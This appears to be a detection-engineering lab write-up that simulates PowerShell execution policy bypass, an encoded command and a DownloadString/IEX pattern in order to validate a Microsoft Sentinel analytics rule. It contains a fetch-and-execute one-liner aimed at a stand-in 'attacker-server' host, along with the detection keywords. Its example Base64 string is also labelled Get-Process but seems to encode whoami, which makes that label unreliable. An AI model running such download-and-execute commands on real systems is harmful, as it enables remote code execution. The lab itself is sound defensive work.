# PowerShell Attack Simulation

## Overview

This document explains the PowerShell attack simulations performed to validate the Microsoft Sentinel detection rule.

PowerShell is a legitimate Windows administration tool, but attackers commonly abuse it after gaining access to a system.

Attackers use PowerShell because:

- It is already available on Windows systems
- It does not require installing additional tools
- It can execute commands, scripts, and remote content
- It can perform post-compromise activities

The objective of this lab is to simulate common attacker PowerShell behaviors and verify that Microsoft Sentinel can detect them.

The following PowerShell behaviors were simulated:

1. Execution Policy Bypass
2. Encoded PowerShell Command
3. DownloadString and Invoke-Expression Pattern


---

# 1. Execution Policy Bypass Simulation

## Attack Scenario

After gaining access to a Windows machine, an attacker may attempt to execute PowerShell commands while bypassing PowerShell execution restrictions.

PowerShell Execution Policy is a security feature that controls script execution.

Attackers may abuse the bypass option to execute commands without following the configured policy.


## Command Used

powershell.exe -ExecutionPolicy Bypass -Command "whoami"

Explanation

The command contains three parts:

powershell.exe

Starts the PowerShell process.

Attackers commonly use PowerShell because it is a trusted Windows binary and activity may blend with normal administrative operations.

-ExecutionPolicy Bypass

Temporarily bypasses PowerShell execution restrictions.

In a real attack scenario, attackers may use this to execute PowerShell scripts or commands that would otherwise be blocked.

Note:

ExecutionPolicy Bypass alone does not always mean malicious activity.

Administrators may also use it for:

Automation

Testing

Troubleshooting


Detection depends on the overall behavior and context.

whoami

The whoami command displays the current logged-in user.

Attackers use this after compromise to perform user discovery.

They want to identify:

Current user

Domain

Privilege level

Available access


MITRE ATT&CK:

T1059.001 - PowerShell

T1033 - System Owner/User Discovery


---

Simulation Performed

Step 1: Execute Command

Opened the Windows VirtualBox machine.

Started PowerShell.

Executed:

powershell.exe -ExecutionPolicy Bypass -Command "whoami"

<img width="730" height="91" alt="image" src="https://github.com/user-attachments/assets/a89a4fb4-8d13-4e4f-b7d4-b84b52af941a" />


The command executed successfully and returned the current user information.

Step 2: Generate Security Logs

After execution, Windows generated a process creation event.

Event generated:

Event ID: 4688

Event Name:

Process Creation

The event contained:

PowerShell process

Command line

User information

Timestamp


Step 3: Verify Logs

The generated event was verified in Log Analytics Workspace.

The SecurityEvent table showed the PowerShell execution activity.

<img width="1867" height="831" alt="image" src="https://github.com/user-attachments/assets/f264a958-4ef8-4794-b78a-03598ea9b07f" />


Step 4: Sentinel Detection

Microsoft Sentinel Analytics Rule monitored SecurityEvent logs.

The rule identified suspicious PowerShell execution based on:

PowerShell process

Suspicious parameters

Command line indicators

AnalyticalRule For Suspicious PowershellCommand is created which would monitor logs and generates alerts and incidents 
<img width="1878" height="844" alt="image" src="https://github.com/user-attachments/assets/a345d744-8015-48c0-9689-7786215e2915" />



Result:

Alert generated

<img width="1890" height="870" alt="image" src="https://github.com/user-attachments/assets/022f4e17-58d6-4c18-bc71-17359ca2866e" />



Incident created

<img width="1919" height="815" alt="image" src="https://github.com/user-attachments/assets/10da447c-89bb-4f19-8029-d8fd40889fbb" />

<img width="1913" height="845" alt="image" src="https://github.com/user-attachments/assets/d4c753a9-eadd-4bb2-a107-d1a7ebae50f0" />




---

2. Encoded PowerShell Command Simulation

Attack Scenario

Attackers often encode PowerShell commands to hide the actual command being executed.

This technique is commonly used to make analysis harder and bypass simple detections.

Command Used

powershell.exe -EncodedCommand dwBoAG8AYQBtAGkA


Explanation

PowerShell supports encoded commands using:

-EncodedCommand

The encoded value is Base64 format.

The above encoded command represents:

Get-Process

When executed:

PowerShell decodes the value internally and runs the command.

Why Attackers Use Encoded Commands

Attackers use encoding to:

Hide readable commands

Obfuscate scripts

Avoid simple keyword detection

Make investigation difficult


MITRE ATT&CK:

T1027 - Obfuscated Files or Information

T1059.001 - PowerShell


---

Simulation Performed

Step 1: Generate Encoded Command

Created a Base64 encoded PowerShell command.

Step 2: Execute Command

Executed the encoded PowerShell command in the Windows VM.

<img width="852" height="161" alt="image" src="https://github.com/user-attachments/assets/4e31d0c3-30f9-4449-894c-08b0353ea6f4" />


Step 3: Generate Logs

Windows generated:

Event ID: 4688

Process Creation

The event captured:

PowerShell execution

Encoded command parameter

User context


Step 4: Verify Logs

Checked Log Analytics Workspace.

The SecurityEvent table contained the PowerShell execution event.

<img width="1869" height="716" alt="image" src="https://github.com/user-attachments/assets/34c68abe-a28c-4d08-b082-fa403af322f5" />


Step 5: Sentinel Detection

Microsoft Sentinel Analytics Rule detected the encoded PowerShell activity.

Result:


Incident generated

<img width="1869" height="862" alt="image" src="https://github.com/user-attachments/assets/f38e6159-a432-4237-bf00-c86cc17d37cb" />

Alert Created

This alert is created at 11:20PM
<img width="1919" height="667" alt="image" src="https://github.com/user-attachments/assets/48e54a6b-b0a1-41be-a967-d4085fc2985f" />

Alert Details:
<img width="1827" height="828" alt="image" src="https://github.com/user-attachments/assets/d97f793f-f25d-486d-8a4b-7b9064bc2e62" />






---

3. DownloadString and Invoke-Expression Pattern

# PowerShell DownloadString and Invoke-Expression (IEX) Attack Simulation

## Overview

This  explains the simulation of suspicious PowerShell download and execution behavior.

Attackers commonly abuse PowerShell after gaining access to a Windows machine.

The goal of this simulation was to replicate attacker behavior where PowerShell downloads remote content and executes it.

This detection focuses on:

- PowerShell execution
- Remote content download
- In-memory execution using Invoke-Expression (IEX)


MITRE ATT&CK:

- T1059.001 - Command and Scripting Interpreter: PowerShell
- T1105 - Ingress Tool Transfer


---

# Attack Simulation

## Step 1: Create PowerShell Script Files


Created sample PowerShell files inside:

C:\Temp

Files created:

TestScript.ps1 Welcome.ps1

The .ps1 extension represents a PowerShell script file.

A PowerShell script contains commands that are executed by the PowerShell engine.


---

# TestScript.ps1 Content


```powershell
Write-Output "DownloadString Test Executed Successfully"

<img width="1917" height="290" alt="image" src="https://github.com/user-attachments/assets/b6475ca8-74e5-44af-b637-22408f1ae63e" />



Explanation

The script contains a harmless PowerShell command.

When executed, it prints:

DownloadString Test Executed Successfully

This was created only to simulate downloaded content safely.


---

Welcome.ps1 Content

whoami

<img width="1632" height="255" alt="image" src="https://github.com/user-attachments/assets/5d4cae5a-841b-4e3a-b010-d9fe01b5077f" />


Explanation

This command displays the current user context.

Attackers commonly perform discovery commands after gaining access to understand:

Current user

Privileges

Machine context



---

Step 2: Start Python HTTP Server

Command executed:

python -m http.server 8000

Why was this used?

Python HTTP server converts the current folder into a temporary web server.

The VM starts serving files from the folder where the command is executed.

Example:

C:\Temp

 |
 |--- TestScript.ps1
 |
 |--- Welcome.ps1

After starting the server:

http://localhost:8000

The files become available through HTTP.

The Windows VM is acting as a temporary server hosting PowerShell files.

<img width="1378" height="185" alt="image" src="https://github.com/user-attachments/assets/dbdcfc2e-9cd2-4ea3-93d6-64a367894c54" />



---

Step 3: Verify Hosted Files

Opened in browser:

http://localhost:8000

The hosted files were visible:

TestScript.ps1
Welcome.ps1

<img width="1917" height="420" alt="image" src="https://github.com/user-attachments/assets/9eddadc2-4626-48b2-b840-8846621e5a40" />


This confirms that the HTTP server is successfully serving the files.


---

Step 4: Execute Download and Execution Command

Command executed:

powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadString('http://localhost:8000/TestScript.ps1')"

<img width="1592" height="146" alt="image" src="https://github.com/user-attachments/assets/ee6e1e67-f7d5-4194-99f1-79de29b38063" />



---

Command Explanation

powershell.exe

Starts the PowerShell process.

Attackers abuse PowerShell because it is a built-in Windows tool that can:

Execute commands

Run scripts

Download content

Perform system discovery



---

New-Object Net.WebClient

Creates a web client object.

It allows PowerShell to communicate with a URL and retrieve content.


---

DownloadString()

Downloads the content from the provided URL as text.

Example:

http://localhost:8000/TestScript.ps1

PowerShell downloads the script content into memory.


---

IEX (Invoke-Expression)

Executes the downloaded PowerShell content.

Execution flow:

Download Script

        |

Read Script Content

        |

Invoke-Expression Executes Content

Output:

DownloadString Test Executed Successfully

This confirms the script was downloaded and executed successfully.


---

Attacker Abuse Explanation

In a real attack scenario:

The attacker hosts a malicious PowerShell script on their own server.

Example:

Attacker Server

malicious.ps1

The victim machine runs:

IEX(New-Object Net.WebClient).DownloadString('http://attacker-server/malicious.ps1')

Attack flow:

Attacker Server

        |

        |

        v

Victim Windows Machine

        |

        |

PowerShell downloads script
   |

        |

IEX executes script

The victim machine connects to the attacker-controlled server and downloads the content.


---

Why Attackers Use This Technique

Attackers use DownloadString + IEX because:

Script can execute without saving a file

Content can run directly in memory

Helps avoid simple file-based detection

Allows remote execution of PowerShell code


---

Sentinel Detection Logic

The analytics rule checks for suspicious PowerShell patterns:

powershell.exe

DownloadString

IEX

Invoke-Expression

If these patterns appear in the command line, Sentinel creates an alert.


Logs
<img width="1919" height="796" alt="image" src="https://github.com/user-attachments/assets/8f6a414e-aa83-4ea4-92f4-c6165e1a9965" />


Incident Created

<img width="1919" height="814" alt="image" src="https://github.com/user-attachments/assets/eec3b24a-7379-401b-9a17-b24aeb219c96" />

Incident Details

<img width="1919" height="881" alt="image" src="https://github.com/user-attachments/assets/87283af2-3618-47c5-a391-e417b9155bb7" />

Investigation:
<img width="1919" height="809" alt="image" src="https://github.com/user-attachments/assets/e7474d0e-251f-402d-bc33-b4c92eb4eea1" />




ALert Created
<img width="1623" height="793" alt="image" src="https://github.com/user-attachments/assets/fb12f0b6-88aa-4143-a973-af6941681eb0" />


---
---

Result

Successfully simulated:

PowerShell remote content download

PowerShell execution

Invoke-Expression behavior


The activity was detected through Microsoft Sentinel analytics rule and generated an alert/incident.
